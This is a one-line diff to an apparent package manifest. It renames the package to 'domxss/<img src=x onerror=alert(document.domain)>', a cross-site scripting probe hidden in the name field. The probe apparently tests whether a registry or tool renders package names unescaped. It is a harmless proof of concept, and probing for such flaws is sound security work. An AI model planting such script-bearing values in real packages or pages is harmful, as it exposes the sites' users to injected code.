@@ -1,1 +1,1 @@
-{ "name": "hardik0013/pk-tp-test" }
+{ "name": "domxss/<img src=x onerror=alert(document.domain)>", "version": "1.0.0" }
